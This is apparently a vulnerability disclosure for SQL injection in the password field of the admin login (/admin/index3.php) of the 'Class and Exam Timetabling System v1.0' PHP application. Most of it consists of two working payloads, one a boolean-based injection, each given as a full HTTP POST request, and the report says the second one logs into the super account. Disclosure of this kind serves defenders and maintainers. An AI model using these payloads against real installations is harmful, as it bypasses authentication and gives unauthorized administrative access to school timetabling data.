# Class and Exam Timetabling System v1.0 has SQL injection

BUG_Author:muhan

Website source address: https://www.sourcecodester.com/php/11332/class-and-exam-timetabling.html

Vulnerability File: /admin/index3.php

POST parameter 'password' exists SQL injection vulnerability

Payload1: username=ADMIN&password=a%27+OR+NOT+666%3D666%23&go=Log+In

```
POST /admin/index3.php HTTP/1.1
Host: localhost
Content-Length: 58
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/admin/index3.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

username=ADMIN&password=a%27+OR+NOT+666%3D666%23&go=Log+In
```

Login error

![image](https://github.com/anquanclub/picture/blob/main/fail.png)

Payload2: username=ADMIN&password=a%27+OR+NOT+666%3D667%23&go=Log+In

```
POST /admin/index3.php HTTP/1.1
Host: localhost
Content-Length: 58
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/admin/index3.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

username=ADMIN&password=a%27+OR+NOT+666%3D667%23&go=Log+In
```

The super account is successfully logged in.

![image](https://github.com/anquanclub/picture/blob/main/success.png)
